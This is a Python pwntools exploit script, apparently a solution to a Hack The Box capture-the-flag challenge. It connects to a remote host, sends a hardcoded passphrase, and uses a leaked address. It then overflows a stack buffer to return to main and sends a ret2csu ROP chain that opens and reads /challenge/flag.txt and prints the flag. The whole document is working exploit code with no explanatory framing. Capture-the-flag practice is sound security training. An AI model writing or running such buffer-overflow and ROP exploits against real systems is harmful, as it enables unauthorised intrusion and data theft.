#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

# Stage 1: ret2main → main will call finale() → we overflow again
r.send(b'A' * 72 + p64(0x401393))  # main
# Main will: banner, open/read/close urandom, printf, prompt, scanf for phrase
# We need to send the secret phrase again
r.recvuntil(b'secret phrase: ', timeout=5)
r.sendline(b's34s0nf1n4l3b00')
# Now main calls finale() - we should see its prompt
r.recvuntil(b'[0x')
buf_leak2 = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak2: {hex(buf_leak2)}')
r.recvuntil(b'wish for next year: ')

# Stage 2: CSU read(path) → CSU open → CSU read(flag) → puts
csu_pop = 0x401512
csu_call = 0x4014f8
pop_rdi = 0x4011f2
got_read = 0x403250
got_open = 0x403278
bss_path = 0x404100
bss_data = 0x404200

p2 = b'A' * 72
p2 += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss_path) + p64(32) + p64(got_read)
p2 += p64(csu_call) + p64(0) + p64(0)*6
p2 += p64(csu_pop) + p64(0) + p64(1) + p64(bss_path) + p64(0) + p64(0) + p64(got_open)
p2 += p64(csu_call) + p64(0) + p64(0)*6
p2 += p64(csu_pop) + p64(0) + p64(1) + p64(3) + p64(bss_data) + p64(0x100) + p64(got_read)
p2 += p64(csu_call) + p64(0) + p64(0)*6
p2 += p64(pop_rdi) + p64(bss_data)
p2 += p64(0x401040)
p2 += p64(0x401393)

r.send(p2)
import time
time.sleep(0.5)
r.send(b'/challenge/flag.txt\x00')
time.sleep(1)
data = r.recv(timeout=3).strip()
print(f'Result: {data[:300]}')
if b'{' in data:
    flag = data[data.index(b'{'):data.index(b'}')+1]
    print(f'FLAG: HTB{{{flag[1:-1].decode()}}}')
r.close()
